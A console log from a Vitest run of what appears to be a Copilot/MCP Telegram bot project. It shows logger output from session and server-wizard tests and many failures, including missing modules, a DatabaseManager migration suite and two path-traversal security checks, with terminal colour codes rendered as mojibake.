2026-02-12T17:11:40.628Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":true}
2026-02-12T17:11:40.629Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.629Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}

[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 5: Plan mode preserved on model/MCP changes[2m > [22m[2mshould not include systemMessage when not in plan mode[22m[39m
2026-02-12T17:11:40.661Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.661Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.662Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project","sessionAge":1}
2026-02-12T17:11:40.662Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project"}
2026-02-12T17:11:40.662Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.662Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}

 [32mÃ”Â£Ã´[39m tests/plan-mode-fixes.test.ts [2m ([22m[2m9 tests[22m[2m)[22m[33m 962[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/database-sqljs-migration.test.ts [2m ([22m[2m14 tests[22m [2m|[22m [31m14 failed[39m[2m)[22m[90m 126[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould initialize in-memory database[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould create database file on disk[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould create all required tables on migration[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould execute INSERT and SELECT queries[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould get single row with getFirst helper[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould get all rows with getAll helper[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould handle UPDATE queries[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould handle DELETE queries[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould auto-save on modification when using file database[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould handle lastInsertRowid correctly[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould support UPSERT (INSERT OR REPLACE)[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould load existing database from file[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould handle migration of allowed_paths_configured column[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[31m   [31mâ”œÃ¹[31m DatabaseManager - sql.js Migration[2m > [22mshould support ON CONFLICT for mcp_servers upsert[39m
[31m     Ã”Ã¥Ã† DatabaseManager.create is not a function[39m
[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mstartWizard[2m > [22m[2mshould start a new wizard session[22m[39m
2026-02-12T17:11:40.645Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mstartWizard[2m > [22m[2mshould not allow multiple concurrent wizards for same user[22m[39m
2026-02-12T17:11:40.653Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mstartWizard[2m > [22m[2mshould allow wizards for different users[22m[39m
2026-02-12T17:11:40.656Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.656Z [[32minfo[39m]: Wizard started {"userId":2}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mhandleInput[2m > [22m[2mshould progress through STDIO server creation[22m[39m
2026-02-12T17:11:40.659Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.839Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"my-server","serverType":"stdio"}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mhandleInput[2m > [22m[2mshould progress through HTTP server creation[22m[39m
2026-02-12T17:11:40.843Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.845Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"my-http-server","serverType":"http"}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mhandleInput[2m > [22m[2mshould reject invalid server name[22m[39m
2026-02-12T17:11:40.848Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mhandleInput[2m > [22m[2mshould reject invalid type selection[22m[39m
2026-02-12T17:11:40.850Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mhandleInput[2m > [22m[2mshould handle environment variables parsing[22m[39m
2026-02-12T17:11:40.852Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mhandleInput[2m > [22m[2mshould allow cancelling wizard[22m[39m
2026-02-12T17:11:40.856Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.856Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mcancelWizard[2m > [22m[2mshould cancel active wizard[22m[39m
2026-02-12T17:11:40.860Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.861Z [[32minfo[39m]: Wizard cancelled {"userId":1}
2026-02-12T17:11:40.861Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mgetStatus[2m > [22m[2mshould return status of active wizard[22m[39m
2026-02-12T17:11:40.865Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mtimeout handling[2m > [22m[2mshould expire wizard after 5 minutes of inactivity[22m[39m
2026-02-12T17:11:40.870Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mtimeout handling[2m > [22m[2mshould not expire wizard with recent activity[22m[39m
2026-02-12T17:11:40.872Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mdata validation[2m > [22m[2mshould validate command is not empty[22m[39m
2026-02-12T17:11:40.876Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mdata validation[2m > [22m[2mshould validate URL format[22m[39m
2026-02-12T17:11:40.878Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mdata validation[2m > [22m[2mshould accept empty args[22m[39m
2026-02-12T17:11:40.880Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mdata validation[2m > [22m[2mshould parse arguments correctly[22m[39m
2026-02-12T17:11:40.881Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.035Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}

[90mstdout[2m | tests/server-wizard.test.ts[2m > [22m[2mServerWizard[2m > [22m[2mrestart after bot restart[2m > [22m[2mshould clear all wizards on initialization[22m[39m
2026-02-12T17:11:41.038Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.038Z [[32minfo[39m]: Wizard started {"userId":2}
2026-02-12T17:11:41.039Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.039Z [[32minfo[39m]: Wizard started {"userId":2}

 [32mÃ”Â£Ã´[39m tests/server-wizard.test.ts [2m ([22m[2m21 tests[22m[2m)[22m[33m 409[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/cross-platform-utils.test.ts [2m ([22m[2m33 tests[22m[2m)[22m[90m 21[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/atomic-lock-concurrency.test.ts [2m ([22m[2m18 tests[22m[2m)[22m[90m 155[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/env-parser.test.ts [2m ([22m[2m42 tests[22m[2m)[22m[90m 34[2mms[22m[39m
[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log assistant.message_delta events with structured data[22m[39m
2026-02-12T17:11:41.942Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log assistant.message_delta events with structured data[22m[39m
2026-02-12T17:11:42.142Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":200,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log session.idle events with final buffer size[22m[39m
2026-02-12T17:11:42.311Z [[32minfo[39m]: Starting Copilot API call {"chatId":"789","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log session.idle events with final buffer size[22m[39m
2026-02-12T17:11:42.511Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"789","userId":"user123","elapsedMs":200,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log session.error events with error message[22m[39m
2026-02-12T17:11:42.360Z [[32minfo[39m]: Starting Copilot API call {"chatId":"999","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log session.error events with error message[22m[39m
2026-02-12T17:11:42.460Z [[31merror[39m]: SDK event: session.error {"event":"session.error","chatId":"999","errorMessage":"Test error occurred","elapsedMs":100,"elapsedSeconds":0}
2026-02-12T17:11:42.460Z [[31merror[39m]: Copilot API call failed {"chatId":"999","userId":"user123","durationMs":100,"durationSeconds":0,"error":"Test error occurred","success":false}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log unknown event types for visibility[22m[39m
2026-02-12T17:11:42.412Z [[32minfo[39m]: Starting Copilot API call {"chatId":"555","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log unknown event types for visibility[22m[39m
2026-02-12T17:11:42.612Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"555","userId":"user123","elapsedMs":200,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/sdk-event-logging.test.ts[2m > [22m[2mSDK Event Logging[2m > [22m[2mshould log stale period warning when no events for >2 minutes[22m[39m
2026-02-12T17:11:42.459Z [[32minfo[39m]: Starting Copilot API call {"chatId":"888","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

 [31mÃ”Ã˜Â»[39m tests/sdk-event-logging.test.ts [2m ([22m[2m5 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 579[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m SDK Event Logging[2m > [22mshould log stale period warning when no events for >2 minutes[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ Ã”Ã‡Âª(2) ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
 [31mÃ”Ã˜Â»[39m tests/timeout-confirmation.test.ts [2m ([22m[2m11 tests[22m [2m|[22m [31m2 failed[39m[2m)[22m[90m 114[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Interactive Timeout Confirmation[2m > [22mCallback Handler Registration[2m > [22mshould register callback handler for timeout responses[39m
[31m     Ã”Ã¥Ã† expected undefined not to be undefined[39m
[31m   [31mâ”œÃ¹[31m Interactive Timeout Confirmation[2m > [22mCallback Handler Registration[2m > [22mshould handle callback query for extend action[39m
[31m     Ã”Ã¥Ã† expected undefined not to be undefined[39m
stderr | tests/security-path-traversal.test.ts > Path Traversal Security Tests > Empty Allowlist Security > should deny all paths when allowlist is empty
Ã”ÃœÃ¡Â´Â©Ã…  SEGURIDAD: ALLOWED_PATHS vacâ”œÂ¡o. El bot solicitarâ”œÃ­ configuraciâ”œâ”‚n en primer inicio.

stderr | tests/security-path-traversal.test.ts > Path Traversal Security Tests > Empty Allowlist Security > should deny all paths when allowlist is undefined
Ã”ÃœÃ¡Â´Â©Ã…  SEGURIDAD: ALLOWED_PATHS vacâ”œÂ¡o. El bot solicitarâ”œÃ­ configuraciâ”œâ”‚n en primer inicio.

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mWindows paths without double escaping[2m > [22m[2mshould preserve Windows paths with single backslashes[22m[39m
2026-02-12T17:11:38.582Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:39.131Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"windows-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mWindows paths without double escaping[2m > [22m[2mshould handle multiple Windows paths in arguments[22m[39m
2026-02-12T17:11:39.139Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:39.385Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"multi-path","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mWindows paths without double escaping[2m > [22m[2mshould handle UNC paths (double backslash preserved)[22m[39m
2026-02-12T17:11:39.388Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:39.626Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"unc-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mWindows paths without double escaping[2m > [22m[2mshould handle paths with trailing backslash[22m[39m
2026-02-12T17:11:39.632Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.025Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"trailing-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mValid escape sequences still work[2m > [22m[2mshould escape double quotes inside double-quoted strings[22m[39m
2026-02-12T17:11:40.031Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.326Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"escape-quote-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mValid escape sequences still work[2m > [22m[2mshould escape single quotes inside single-quoted strings[22m[39m
2026-02-12T17:11:40.330Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.562Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"escape-single-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mValid escape sequences still work[2m > [22m[2mshould escape backslashes when doubled[22m[39m
2026-02-12T17:11:40.566Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.762Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"escape-backslash-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mValid escape sequences still work[2m > [22m[2mshould handle mix of Windows paths and escaped quotes[22m[39m
2026-02-12T17:11:40.766Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:40.928Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"mixed-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mEdge cases[2m > [22m[2mshould handle quoted path ending with backslash - ISSUE #1[22m[39m
2026-02-12T17:11:40.930Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.088Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"quoted-trailing-backslash","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mEdge cases[2m > [22m[2mshould handle multiple quoted paths ending with backslash[22m[39m
2026-02-12T17:11:41.092Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.244Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"multi-trailing","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mEdge cases[2m > [22m[2mshould handle backslash at end of input[22m[39m
2026-02-12T17:11:41.247Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.437Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"end-backslash","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mEdge cases[2m > [22m[2mshould handle backslash before space (not escapable)[22m[39m
2026-02-12T17:11:41.439Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.591Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"backslash-space","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mEdge cases[2m > [22m[2mshould preserve backslash before regular characters[22m[39m
2026-02-12T17:11:41.593Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.733Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"backslash-regular","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mEdge cases[2m > [22m[2mshould handle quoted Windows paths[22m[39m
2026-02-12T17:11:41.735Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.882Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"quoted-path","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mExisting functionality preserved[2m > [22m[2mshould still handle simple space-separated args[22m[39m
2026-02-12T17:11:41.884Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.035Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"simple-args","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mExisting functionality preserved[2m > [22m[2mshould handle quoted arguments with spaces[22m[39m
2026-02-12T17:11:42.037Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.203Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"quoted-args","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mExisting functionality preserved[2m > [22m[2mshould handle mixed single and double quotes[22m[39m
2026-02-12T17:11:42.205Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.381Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"mixed-quotes","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mExisting functionality preserved[2m > [22m[2mshould handle empty args[22m[39m
2026-02-12T17:11:42.384Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.544Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"no-args","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mReal-world scenarios[2m > [22m[2mshould handle typical Windows npx command[22m[39m
2026-02-12T17:11:42.548Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.740Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"npx-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mReal-world scenarios[2m > [22m[2mshould handle Python script with Windows path[22m[39m
2026-02-12T17:11:42.743Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.958Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"python-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-parseargs-windows-paths.test.ts[2m > [22m[2mServerWizard - parseArgs Windows Paths[2m > [22m[2mReal-world scenarios[2m > [22m[2mshould handle node with multiple path arguments[22m[39m
2026-02-12T17:11:42.961Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:43.147Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-paths","serverType":"stdio"}

 [32mÃ”Â£Ã´[39m tests/wizard-parseargs-windows-paths.test.ts [2m ([22m[2m21 tests[22m[2m)[22m[33m 4583[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/security-path-traversal.test.ts [2m ([22m[2m26 tests[22m [2m|[22m [31m2 failed[39m[2m)[22m[33m 3541[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Path Traversal Security Tests[2m > [22mPath Traversal Attacks[2m > [22mshould block path traversal with URL encoding[39m
[31m     Ã”Ã¥Ã† expected true to be false // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m Path Traversal Security Tests[2m > [22mPath Traversal Attacks[2m > [22mshould block Unicode path traversal attempts[39m
[31m     Ã”Ã¥Ã† expected true to be false // Object.is equality[39m
 [31mÃ”Ã˜Â»[39m tests/keyboard-expiration.test.ts [2m ([22m[2m15 tests[22m [2m|[22m [31m15 failed[39m[2m)[22m[90m 124[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22mgenerateCallbackData[2m > [22mshould include timestamp in callback_data[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22mgenerateCallbackData[2m > [22mshould handle multiple colons in data[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22mgenerateCallbackData[2m > [22mshould generate different timestamps for sequential calls[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22misCallbackValid[2m > [22mshould accept fresh callback data[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22misCallbackValid[2m > [22mshould reject expired callback data[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22misCallbackValid[2m > [22mshould accept callback within TTL[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22misCallbackValid[2m > [22mshould handle callback data with multiple colons[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22misCallbackValid[2m > [22mshould handle invalid timestamp gracefully[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22misCallbackValid[2m > [22mshould handle callback data without timestamp[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22mextractCallbackParts[2m > [22mshould extract action and data from callback with timestamp[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22mextractCallbackParts[2m > [22mshould handle data with colons[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22mConfig - KEYBOARD_TTL_MS[2m > [22mshould use default TTL of 5 minutes[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Keyboard Expiration[2m > [22mConfig - KEYBOARD_TTL_MS[2m > [22mshould respect custom TTL from environment[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Callback Handlers - Expiration Validation[2m > [22mshould validate timestamp before processing model callback[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/callbacks'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
[31m   [31mâ”œÃ¹[31m Callback Handlers - Expiration Validation[2m > [22mshould process valid callback normally[39m
[31m     Ã”Ã¥Ã† Cannot find module '../src/bot/callbacks'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts[39m
 [31mÃ”Ã˜Â»[39m tests/tarea-4-5-ci-cd.test.ts [2m ([22m[2m0 test[22m[2m)[22m
[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCommand with arguments in command step[2m > [22m[2mshould extract command and args from full command string[22m[39m
2026-02-12T17:11:41.409Z [[32minfo[39m]: Wizard started {"userId":1}
